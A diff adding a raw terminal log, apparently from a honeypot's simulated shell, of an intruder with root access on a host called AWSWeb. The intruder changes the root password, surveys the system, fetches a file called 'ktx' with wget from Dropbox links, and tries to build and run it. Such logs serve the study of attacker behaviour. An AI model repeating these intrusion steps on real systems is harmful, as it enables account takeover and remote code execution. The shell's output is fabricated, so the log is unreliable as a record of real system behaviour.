@@ -1,0 +1,445 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# la -al
+bash: la: command not found
+AWSWeb:~# ls -al
+[4ldrwxr-xr-x 1 root root 4096 2013-11-29 16:41 .
+drwxr-xr-x 1 root root 4096 2013-11-29 16:41 ..
+drwxr-xr-x 1 root root 4096 2009-11-06 11:16 .debtags
+-rw------- 1 root root 5515 2009-11-20 09:08 .viminfo
+drwx------ 1 root root 4096 2009-11-06 11:13 .aptitude
+-rw-r--r-- 1 root root  140 2009-11-06 11:09 .profile
+-rw-r--r-- 1 root root  412 2009-11-06 11:09 .bashrc
+[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# clear
+[4lc[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# gcc
+bash: gcc: command not found
+AWSWeb:~# uname -al
+[4lLinux
+[4hAWSWeb:~# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# clear
+[4lc[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      
+selinux    tmp        proc       sbin       etc        dev        srv        
+initrd.img lib        home       var        usr        boot       root       
+lost+found 
+[4hAWSWeb:/# clear
+[4lc[4hAWSWeb:/# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:/# ckear
+bash: ckear: command not found
+AWSWeb:/# clear
+[4lc[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd ..[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd[1D[1P[1D[1Pcd ha[1D[1Poem
+[4lbash: cd: hoem: No such file or directory
+[4hAWSWeb:/# cd home
+[4l[4hAWSWeb:/home# unma [1D[1P[1D[1P[1D[1Pame -svl
+[4lLinux
+[4hAWSWeb:/home# [Kuname -svl[1D[1P[1D[1P-[1D[1P[1D[1P-help
+[4lLinux
+[4hAWSWeb:/home# ls
+[4lrichard 
+[4hAWSWeb:/home# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# uname -h[1D[1P-help
+[4lLinux
+[4hAWSWeb:/# uname
+[4lLinux
+[4hAWSWeb:/# clear
+[4lc[4hAWSWeb:/# [Kclear[5D[Kuname[5D[Kuname --help[12D[Kuname[5D[Kclear[5D[Kcd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd [1D[1P[1D[1P[1D[1Pclear
+[4lc[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd [1D[1P[1D[1P[1D[1Pls -al
+[4ldrwxr-xr-x 1 root root  4096 2013-11-29 16:45 .
+drwxr-xr-x 1 root root  4096 2013-11-29 16:45 ..
+drwxr-xr-x 1 root root     0 2009-11-20 08:19 sys
+drwxr-xr-x 1 root root  4096 2009-11-08 15:42 bin
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 mnt
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 media
+lrwxrwxrwx 1 root root    25 2009-11-06 11:16 vmlinuz -> /boot/vmlinuz-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 opt
+lrwxrwxrwx 1 root root    11 2009-11-06 11:08 cdrom -> /media/cdrom0
+drwxr-xr-x 1 root root  4096 2009-11-06 11:08 selinux
+drwxrwxrwx 1 root root  4096 2009-11-20 08:19 tmp
+dr-xr-xr-x 1 root root     0 2009-11-20 08:19 proc
+drwxr-xr-x 1 root root  4096 2009-11-08 15:41 sbin
+drwxr-xr-x 1 root root  4096 2009-11-20 08:20 etc
+drwxr-xr-x 1 root root  3200 2009-11-20 08:20 dev
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 srv
+lrwxrwxrwx 1 root root    28 2009-11-06 11:16 initrd.img -> /boot/initrd.img-2.6.26-2-686
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 lib
+drwxr-xr-x 1 root root  4096 2009-11-06 11:22 home
+drwxr-xr-x 1 root root  4096 2009-11-06 11:09 var
+drwxr-xr-x 1 root root  4096 2009-11-08 15:46 usr
+drwxr-xr-x 1 root root  4096 2009-11-08 15:39 boot
+drwxr-xr-x 1 root root  4096 2009-11-20 09:08 root
+drwx------ 1 root root 16384 2009-11-06 11:08 lost+found
+[4hAWSWeb:/# cd var
+[4l[4hAWSWeb:/var# ls
+[4lbackups run     mail    cache   log     opt     tmp     local   lib     lock    spool   
+[4hAWSWeb:/var# cd [1D[1P[1D[1P[1D[1Pd[1D[1Pcd log
+[4l[4hAWSWeb:/var/log# ls
+[4lkern.log.1   btmp         syslog       syslog.1     mail.info    lastlog      mail.err     news         dmesg        kern.log     daemon.log.1 fsck         messages     
+apt          auth.log     wtmp         messages.1   daemon.log   lpr.log      faillog      dmesg.1.gz   dpkg.log     debug        boot         dmesg.0      debug.1      
+user.log     mail.warn    mail.log     auth.log.1   
+[4hAWSWeb:/var/log# nano mail.log
+bash: nano: command not found
+AWSWeb:/var/log# ls[1D[1P[1D[1Pcd[1D[1P[1D[1Pcd ..
+[4l[4hAWSWeb:/var# ls
+[4lbackups run     mail    cache   log     opt     tmp     local   lib     lock    spool   
+[4hAWSWeb:/var# clear
+[4lc[4hAWSWeb:/var# netstat -an
+bash: netstat: command not found
+AWSWeb:/var# clear
+[4lc[4hAWSWeb:/var# n[1D[1Pcd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd [1D[1P[1D[1P[1D[1Pcd home[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd tmp
+[4l[4hAWSWeb:/tmp# ls
+[4l[4hAWSWeb:/tmp# ls -al
+[4ldrwxr-xr-x 1 root root 4096 2013-11-29 16:46 .
+drwxr-xr-x 1 root root 4096 2013-11-29 16:46 ..
+drwxrwxrwx 1 root root 4096 2009-11-20 08:19 .ICE-unix
+drwxrwxrwx 1 root root 4096 2009-11-20 08:19 .X11-unix
+[4hAWSWeb:/tmp# c[1D[1Pcd ..[1D[1P[1D[1P[1D[1P[1D[1Pd .ICE-unix
+[4l[4hAWSWeb:/tmp/.ICE-unix# ls
+[4l[4hAWSWeb:/tmp/.ICE-unix# ls ;[1D[1P-al
+[4ldrwxr-xr-x 1 root root 4096 2013-11-29 16:46 .
+drwxr-xr-x 1 root root 4096 2013-11-29 16:46 ..
+[4hAWSWeb:/tmp/.ICE-unix# cd ..
+[4l[4hAWSWeb:/tmp# cd ../../[1D[1P[1D[1P[1D[1Psbin
+[4l[4hAWSWeb:/sbin# ls
+[4lswapon            rarp              fsck.ext2         mkfs.bfs          startpar          telinit           mkfs.ext4         ipmaddr           nameif            
+ifup              installkernel     isosize           update-modules    getty             lsmod             cfdisk            hwclock           debugfs           
+mke2fs            badblocks         e2undo            bootlogd          killall5          modinfo           dhclient          plipconfig        raw               
+e2fsck            fsck              dumpe2fs          pivot_root        slattach          iptunnel          mii-tool          depmod            unix_chkpwd       
+mkfs.minix        udevsettle        grub-install      udevadm           losetup           logsave           mkfs.ext3         blkid             fsck.minix        
+poweroff          fsck.nfs          mkfs.ext2         fsck.ext4         halt              shutdown          fsck.ext3         modprobe          route             
+start-stop-daemon swapoff           rmmod             insmod            tune2fs           dhclient3         mkfs              ctrlaltdel        reboot            
+fsck.ext4dev      resize2fs         sfdisk            sysctl            update-grub       dhclient-script   e2image           sulogin           pam_tally         
+ifconfig          mkfs.ext4dev      unix_update       fdisk             ifdown            runlevel          blockdev          ldconfig          init              
+findfs            mkswap            mkfs.cramfs       fsck.cramfs       e2label           vol_id            udevd             shadowconfig      
+[4hAWSWeb:/sbin# ifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:/sbin# 10.98.55.4 c[1D[1Pcd[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd etc
+[4l[4hAWSWeb:/etc# s[1D[1Pls
+[4lservices               magic.mime             network                python2.5              adjtime                mailcap                shadow-                
+modules                debian_version         ld.so.conf.d           passwd                 localtime              hosts                  rc4.d                  
+rcS.d                  logrotate.d            securetty              mtab                   mime.types             sysctl.d               environment            
+inputrc                initramfs-tools        modprobe.d             debconf.conf           security               vim                    ssh                    
+resolv.conf            skel                   gshadow-               dpkg                   udev                   scsi_id.config         rc6.d                  
+ld.so.cache            rc5.d                  apt                    networks               opt                    group                  inittab                
+issue                  default                issue.net              mailcap.order          dhcp3                  pam.conf               hosts.deny             
+rc.local               python                 nsswitch.conf          rsyslog.conf           wgetrc                 motd.tail              mke2fs.conf            
+rc1.d                  sysctl.conf            rmt                    ld.so.conf             group-                 rc3.d                  adduser.conf           
+init.d                 hosts.allow            gshadow                cron.daily             alternatives           hostname               bash.bashrc            
+rc0.d                  pam.d                  gai.conf               timezone               deluser.conf           lsb-base               passwd-                
+rpc                    magic                  kernel-img.conf        motd                   shadow                 protocols              bash_completion.d      
+host.conf              rc2.d                  profile                X11                    bindresvport.blacklist rsyslog.d              fstab                  
+login.defs             shells                 terminfo               
+[4hAWSWeb:/etc# cd [1D[1P[1D[1P[1D[1Pservices
+bash: services: command not found
+AWSWeb:/etc# apt
+bash: apt: command not found
+AWSWeb:/etc# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/etc# aptg[1D[1P-get install yum
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  yum 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 824.2kB of archives.
+After this operation, 1812.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main yum 1.10-5 [824.2kB]
+Fetched 824.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking yum (from .../archives/yum_1.10-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up yum (1.10-5) ...
+[4hAWSWeb:/etc# [Kapt-get install yum[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pyum install gcc
+[4lyum: Segmentation fault
+[4hAWSWeb:/etc# apt-get install gcc
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  gcc 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 487.2kB of archives.
+After this operation, 1071.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main gcc 1.17-2 [487.2kB]
+Fetched 487.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking gcc (from .../archives/gcc_1.17-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up gcc (1.17-2) ...
+[4hAWSWeb:/etc# ls
+[4lservices               magic.mime             network                python2.5              adjtime                mailcap                shadow-                
+modules                debian_version         ld.so.conf.d           passwd                 localtime              hosts                  rc4.d                  
+rcS.d                  logrotate.d            securetty              mtab                   mime.types             sysctl.d               environment            
+inputrc                initramfs-tools        modprobe.d             debconf.conf           security               vim                    ssh                    
+resolv.conf            skel                   gshadow-               dpkg                   udev                   scsi_id.config         rc6.d                  
+ld.so.cache            rc5.d                  apt                    networks               opt                    group                  inittab                
+issue                  default                issue.net              mailcap.order          dhcp3                  pam.conf               hosts.deny             
+rc.local               python                 nsswitch.conf          rsyslog.conf           wgetrc                 motd.tail              mke2fs.conf            
+rc1.d                  sysctl.conf            rmt                    ld.so.conf             group-                 rc3.d                  adduser.conf           
+init.d                 hosts.allow            gshadow                cron.daily             alternatives           hostname               bash.bashrc            
+rc0.d                  pam.d                  gai.conf               timezone               deluser.conf           lsb-base               passwd-                
+rpc                    magic                  kernel-img.conf        motd                   shadow                 protocols              bash_completion.d      
+host.conf              rc2.d                  profile                X11                    bindresvport.blacklist rsyslog.d              fstab                  
+login.defs             shells                 terminfo               
+[4hAWSWeb:/etc# cd ..
+[4l[4hAWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd h[1D[1Proot
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# wget [1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pgcc
+[4lgcc: Segmentation fault
+[4hAWSWeb:~# gc[1D[1P[1D[1Pwget http://dl.dropboxusercontent.com/s/1bxj9ak8m1octmk/ktx.c
+[4l--2013-11-29 16:51:51--  http://dl.dropboxusercontent.com/s/1bxj9ak8m1octmk/ktx.c
+Connecting to dl.dropboxusercontent.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 38969 (38K) [text/x-csrc; charset=ascii]
+Saving to: `ktx.c
+
+13% [=====>                                 ] 5,427        29K/s  eta 1s100%[======================================>] 38,969       29K/s
+
+2013-11-29 16:51:51 (29 KB/s) - `ktx.c' saved [38969/38969]
+[4hAWSWeb:~# gcc ktx.c -o ktx
+[4lgcc: Segmentation fault
+[4hAWSWeb:~# [Kgcc ktx.c -o ktx
+[4lgcc: Segmentation fault
+[4hAWSWeb:~# ls
+[4lktx.c 
+[4hAWSWeb:~# apt-get insta[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pgdb cc1
+bash: gdb: command not found
+AWSWeb:~# sudo a[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Papt-get update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pinstall updates
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  updates 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 769.2kB of archives.
+After this operation, 1691.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main updates 0.24-5 [769.2kB]
+Fetched 769.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking updates (from .../archives/updates_0.24-5_i386.deb) ...
+Processing triggers for man-db ...
+Setting up updates (0.24-5) ...
+[4hAWSWeb:~# [Kapt-get install updates[1D[1P
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  update 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 878.2kB of archives.
+After this operation, 1931.6kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main update 1.31-8 [878.2kB]
+Fetched 878.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking update (from .../archives/update_1.31-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up update (1.31-8) ...
+[4hAWSWeb:~# [Kapt-get install update[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pgcc
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  gcc 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 510.2kB of archives.
+After this operation, 1122.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main gcc 1.20-9 [510.2kB]
+Fetched 510.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking gcc (from .../archives/gcc_1.20-9_i386.deb) ...
+Processing triggers for man-db ...
+Setting up gcc (1.20-9) ...
+[4hAWSWeb:~# gcc
+[4lgcc: Segmentation fault
+[4hAWSWeb:~# rm -rf 
+[4l[4hAWSWeb:~# rm -rf ktx.c
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# wget http://dl.dropboxusercontent.com/s/66gpt66lvut4gdu/ktx
+[4l--2013-11-29 16:54:38--  http://dl.dropboxusercontent.com/s/66gpt66lvut4gdu/ktx
+Connecting to dl.dropboxusercontent.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 37768 (36K) [application/octet-stream]
+Saving to: `ktx
+
+14% [=====>                                 ] 5,429        20K/s  eta 1s100%[======================================>] 37,768       20K/s
+
+2013-11-29 16:54:39 (20 KB/s) - `ktx' saved [37768/37768]
+[4hAWSWeb:~# chmod 777 ktx
+[4l[4hAWSWeb:~# ./ktx
+bash: ./ktx: command not found
+AWSWeb:~# [K./ktx[1D[1C[1D[1P[1D[1Pxt
+bash: ./kxt: command not found
+AWSWeb:~# ls
+[4lktx 
+[4hAWSWeb:~# ktx
+bash: ktx: command not found
+AWSWeb:~# ./ktx
+bash: ./ktx: command not found
+AWSWeb:~# rm -rf ktx
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# yum
+[4lyum: Segmentation fault
+[4hAWSWeb:~# apt-get --help
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# apt install
+bash: apt: command not found
+AWSWeb:~# clear
+[4lc[4hAWSWeb:~# apt-get insatll gcc[1D[1P[1D[1P[1D[1Pperl
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# [Kapt-get insatll perl[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pstall perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 747.2kB of archives.
+After this operation, 1643.4kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 0.5-1 [747.2kB]
+Fetched 747.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_0.5-1_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (0.5-1) ...
+[4hAWSWeb:~# o[1D[1Pperl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# p[1D[1Pperl lol/p[1D[1P[1D[1P.pl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# lcear[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pclear
+[4lc[4hAWSWeb:~# cd ..
+[4l[4hAWSWeb:/# cd[1D[1P[1D[1Ps
+bash: s: command not found
+AWSWeb:/# ls
+[4lsys        bin        mnt        media      vmlinuz    opt        cdrom      selinux    tmp        proc       sbin       etc        dev        srv        initrd.img 
+lib        home       var        usr        boot       root       lost+found 
+[4hAWSWeb:/# cd sbin
+[4l[4hAWSWeb:/sbin# ls
+[4lswapon            rarp              fsck.ext2         mkfs.bfs          startpar          telinit           mkfs.ext4         ipmaddr           nameif            
+ifup              installkernel     isosize           update-modules    getty             lsmod             cfdisk            hwclock           debugfs           
+mke2fs            badblocks         e2undo            bootlogd          killall5          modinfo           dhclient          plipconfig        raw               
+e2fsck            fsck              dumpe2fs          pivot_root        slattach          iptunnel          mii-tool          depmod            unix_chkpwd       
+mkfs.minix        udevsettle        grub-install      udevadm           losetup           logsave           mkfs.ext3         blkid             fsck.minix        
+poweroff          fsck.nfs          mkfs.ext2         fsck.ext4         halt              shutdown          fsck.ext3         modprobe          route             
+start-stop-daemon swapoff           rmmod             insmod            tune2fs           dhclient3         mkfs              ctrlaltdel        reboot            
+fsck.ext4dev      resize2fs         sfdisk            sysctl            update-grub       dhclient-script   e2image           sulogin           pam_tally         
+ifconfig          mkfs.ext4dev      unix_update       fdisk             ifdown            runlevel          blockdev          ldconfig          init              
+findfs            mkswap            mkfs.cramfs       fsck.cramfs       e2label           vol_id            udevd             shadowconfig      
+[4hAWSWeb:/sbin# cd [1D[1P[1D[1P[1D[1Pd[1D[1Pcd [1D[1P[1D[1P[1D[1Pcd[1D[1P[1D[1Pfind perl
+bash: find: command not found
+AWSWeb:/sbin# find [1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pcd ..
+[4l[4hAWSWeb:/# cd bin
+[4l[4hAWSWeb:/bin# ls
+[4lwhich         cp            sleep         cat           uname         gzip          pwd           dir           kill          zless         tailf         true          
+sed           zcat          mkdir         lsmod         mknod         znew          grep          mv            dmesg         gunzip        df            mountpoint    
+bash          rbash         fgrep         login         pidof         zdiff         chmod         echo          zcmp          netstat       run-parts     touch         
+readlink      chgrp         ps            chown         rmdir         egrep         vdir          sh            mount         zegrep        more          zgrep         
+false         zmore         gzexe         mt            tempfile      ls            hostname      zfgrep        su            ln            cpio          rm            
+zforce        ping          umount        dd            mt-gnu        tar           dnsdomainname uncompress    date          ping6         stty          sync          
+mktemp        
+[4hAWSWeb:/bin# uname
+[4lLinux
+[4hAWSWeb:/bin# uname --[1D[1Pal
+[4lLinux
+[4hAWSWeb:/bin# [Kuname -al[1D[1P[1D[1Phelp
+[4lLinux
+[4hAWSWeb:/bin# clear
+[4lc[4hAWSWeb:/bin# uname ---[1D[1Phelp
+[4lLinux
+[4hAWSWeb:/bin# services httpd start
+bash: services: command not found
+AWSWeb:/bin# clear
+[4lc[4hAWSWeb:/bin# cd ..
+[4l[4hAWSWeb:/# clear
+[4lc[4hAWSWeb:/# u[1D[1Pid
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:/# whoami
+[4lroot
+[4hAWSWeb:/# iwconfig
+bash: iwconfig: command not found
+AWSWeb:/# clear
+[4lc[4hAWSWeb:/# d[1D[1Pid
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:/# whoami
+[4lroot
+[4hAWSWeb:/# ifoc[1D[1P[1D[1P[1D[1P[1D[1P
